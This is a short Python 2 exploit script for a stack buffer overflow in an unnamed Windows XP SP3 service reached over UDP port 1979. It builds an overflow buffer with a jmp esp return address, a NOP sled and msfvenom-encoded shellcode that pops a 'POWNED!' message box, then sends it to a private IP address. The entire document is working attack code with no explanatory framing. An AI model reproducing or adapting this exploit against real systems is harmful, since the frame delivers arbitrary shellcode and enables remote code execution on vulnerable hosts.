import socket
import sys

buf= 'A'*260
buf+= '\x53\x93\x42\x7e' #jmp esp win xp sp3
buf+='\x90'*16 #NOP

# Shellcode
# msfvenom -p windows/messagebox TITLE=GameOver ICON=ERROR TEXT=POWNED! -e x86/#shikata_ga_nai -i 2 -a x86 --platform windows -b '\x00\x0a\x0d' -f c > out

buf += (
"\xd9\xc7\xd9\x74\x24\xf4\xbb\x60\x2a\x0e\x07\x5a\x2b\xc9\xb1"
"\x48\x31\x5a\x18\x03\x5a\x18\x83\xc2\x64\xc8\xfb\xde\xab\xd5"
"\x70\xc5\xc7\xb8\xc3\xa1\x6c\x2b\x2f\x83\xbb\x02\x0e\xe2\x65"
"\x7c\x12\xc2\x9d\x7d\x4a\xde\xdb\x3f\xc5\x10\xfe\xa7\x16\xf2"
"\xd5\xf2\x09\x6d\xb7\x7e\x90\x37\x30\x70\x74\x80\x5f\x72\x87"
"\xa8\x0e\xfd\xdd\x85\x12\xfb\xa4\xd3\x50\xc5\x6c\x1c\x4b\xf4"
"\x1e\x6d\x7d\xc8\xe4\x1c\xba\x89\xc4\x57\x0c\xea\x1f\x64\xfe"
"\xc6\x3e\x97\x0e\x5f\xab\x8c\x61\xa2\xdd\xaf\x19\x32\xa3\x9b"
"\x10\xd6\xae\x43\x39\x2d\xa4\xd5\x8e\x92\xe3\xf8\x83\x5f\x5d"
"\xdb\xdf\xc3\x21\xfc\xb6\x4c\xdf\x27\xc1\xd5\x50\x14\x0b\x66"
"\x25\x9e\x9c\x3c\xa5\xa9\x6e\xaf\x9c\xa7\x7d\x1d\xef\x92\x19"
"\x8d\xfe\x59\xc3\x98\x0c\x40\xd2\x60\xf2\x4c\x65\x09\x04\x7c"
"\x3e\xd2\x9c\x1f\x75\xd5\xb4\xd7\xa3\x22\x13\xe0\x2a\xcf\x86"
"\xac\xa3\x1a\x04\x7c\xd3\x5d\x91\x1a\xbd\x12\x40\x94\x60\x32"
"\xd4\xda\x57\x34\x50\x6a\x13\x55\xf9\x0f\x33\x3e\xa3\x86\x04"
"\x0f\xe4\xcf\xf6\x5e\x1c\xa2\x8e\x6a\x3b\x45\xfd\xf2\x27\x3b"
"\x48\x7a\xff\x61\xa5\x43\xe4\xd8\xca\x27\x2b\x4d\x78\x43\x06"
"\x28\x82\xc8\x03\x4c\x70\x7d\xb5\xe1\xe3\x53\x88\x7b\x3d\x2f"
"\xf8\xc9\x22\xc4\x51\xa0\x3f\x5f\x1e\x71\xe1\xb1\x73\x6d\x95"
"\xbb\x6f\x5d\xa3\xa0\xe2\x27\x71\xa9\x96\x25\x86\x18\xc1\xa4"
"\x5b\x46\x1a\x04\x77\x53\x8c\x77\x05\x71\x53\xfe"
)

try:
    sc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #udp socket
    sc.connect(("192.168.1.107", 1979))
    sc.send(buf + "\n")
    print "[+] Evil buffer sent"
    sc.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
